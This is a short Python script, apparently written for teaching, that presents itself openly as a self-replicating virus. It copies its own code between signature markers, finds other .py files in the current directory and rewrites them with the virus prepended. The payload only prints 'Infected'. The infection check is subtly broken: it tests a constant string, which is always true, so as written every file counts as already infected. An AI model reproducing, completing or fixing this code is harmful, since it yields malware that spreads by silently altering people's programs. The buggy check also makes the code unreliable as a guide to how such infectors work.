#### VIRUS BEGIN ####                                   # virus SIGNATURE

import sys, glob, re

# 1. get a copy of the virus
# 2. find potential victims (other programs)
# 3. check and infect
# 4. optional payload (execute virus program)


#### STEP 1: GET A COPY OF THE VIRUS ####
    # open a copy of the virus to read
    # check if in the virus by looking for signature (#### VIRUS BEGIN ####)
    # save all lines of virus code to vCode variable until reaching the last line (#### VIRUS END ####)

vCode = []                                              # virus list: stores a copy of the file
fh = open(sys.argv[0], "r")                             # open copy of self, read only
lines = fh.readlines()                                  # read all lines of the virus file, save to lines
fh.close()                                              # close the file

inVirus = False                                         # default: not in the virus

for line in lines:                                      # iterate through lines from virus file
    if (re.search('^#### VIRUS BEGIN ####', line)):     # check for the virus SIGNATURE
        inVirus = True                                  # if so, we are in the virus

    if (inVirus):                                       # while in the virus file
        vCode.append(line)                              # add the line to the vCode list
    
    if (re.search('^#### VIRUS END ####', line)):       # check for the last line of the file
        break                                           # stop copying because end of virus code


#### STEP 2: FIND POTENTIAL VICTIMS (PROGRAMS) ####
progs = glob.glob("*.py")                               # search for all programs with a *.py extension using glob method


#### STEP 3: CHECK AND INFECT ####
    # look through potential program victims, check if infected or not
    # if infected, skip, move on to the next program
    # if NOT infected, re-write the program as a copy of the original program code (pCode) 
    # AND a copy of virus code (vCode)

for prog in progs:                                      # iterate through selected programs
    fh = open(prog, "r")                                # open the program file as read only
    pCode = fh.readlines()                              # read lines in file, save to pCode variable
    fh.close()                                          # close the file

    infected = False                                    # default assumption is that program is NOT infected

    for line in pCode:                                  # iterate through lines from program file
        if ('#### VIRUS BEGIN ####'):                   # check if virus SIGNATURE is present
            infected = True                             # if so, mark infected as True
            break                                       

    if not infected:                                    # if infected is False, you want to infect the program
        newCode = []                                    # newCode will be a collection of original program code plus virus code
        if ('#!' in pCode[0]):                          # check for the first line of the virus -- starts with #
            newCode.append(pCode.pop(0))                # add that first line to newCode
        newCode.extend(vCode)                           # load all virus code into newCode
        newCode.extend(pCode)                           # load all original program code into newCode

        # write new virus-infected program code:
        fh = open(prog, 'w')                            # open the program code for writing, so it can be edited
        fh.writelines(newCode)                          # add all lines from newCode (contains virus and program) to program
        fh.close()                                      # close the file


#### STEP 4: OPTIONAL PAYLOAD: EXECUTE VIRUS CODE ####

print("Infected")


#### VIRUS END ####